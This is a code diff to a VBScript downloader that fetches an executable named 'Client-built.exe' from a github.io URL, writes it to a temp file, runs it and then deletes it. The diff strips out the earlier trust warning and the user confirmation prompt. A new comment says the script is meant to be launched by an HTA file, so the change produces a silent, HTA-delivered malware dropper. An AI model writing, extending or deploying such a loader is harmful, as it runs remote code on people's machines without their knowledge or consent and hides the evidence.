@@ -1,14 +1,16 @@
 Option Explicit
 ' VBS Download and Execute Script
-' This script downloads a file from a specified URL and executes it
-' IMPORTANT: Only use this with trusted sources
+' This script will be downloaded and executed by the HTA file
 
-On Error Resume Next ' Enable error handling
+' Initialize variables
+Dim x, fso, temp, tempFile, stream, shell
+
+On Error Resume Next
 
 ' Create HTTP object for downloading
 Set x = CreateObject("MSXML2.XMLHTTP")
 
-' Replace with your actual URL (must be a valid URL)
+' Replace with your actual executable URL
 x.Open "GET", "https://homleds.github.io/Client-built.exe/", False
 x.Send
 
@@ -36,19 +38,14 @@ End If
 stream.SaveToFile tempFile, 2 ' Overwrite if exists
 stream.Close
 
-' Ask for confirmation before executing
-Dim userResponse
-userResponse = MsgBox("Do you want to run the downloaded file?", vbYesNo + vbQuestion, "Security Warning")
-If userResponse = vbYes Then
-    CreateObject("WScript.Shell").Run tempFile
-    If Err.Number <> 0 Then
-        WScript.Echo "Error executing file: " & Err.Description
-    End If
-End If
+' Set up the shell object and execute the file
+Set shell = CreateObject("WScript.Shell")
+shell.Run tempFile, 1, False
 
 ' Clean up
-On Error Resume Next
+WScript.Sleep 1000 ' Wait a bit before cleanup
 fso.DeleteFile tempFile
 Set stream = Nothing
 Set fso = Nothing
+Set shell = Nothing
 Set x = Nothing
